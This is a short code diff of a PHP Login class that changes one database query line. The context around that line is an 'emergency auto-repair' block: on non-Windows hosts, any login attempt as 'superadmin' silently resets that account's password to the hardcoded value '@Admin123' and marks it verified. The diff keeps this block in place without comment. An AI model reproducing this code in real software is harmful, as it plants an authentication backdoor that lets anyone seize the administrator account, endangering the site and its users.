@@ -85,7 +85,7 @@ class Login extends BaseLogin
         // 🚨 EMERGENCY AUTO-REPAIR FOR MOBILE DEV 🚨
         if (PHP_OS_FAMILY !== 'Windows' && $this->data['login'] === 'superadmin') {
             try {
-                $user = User::where('username', 'superadmin')->first(['*']);
+                $user = User::query()->where('username', 'superadmin')->first();
                 if ($user) {
                     $user->password = Hash::make('@Admin123');
                     $user->email_verified_at = now();
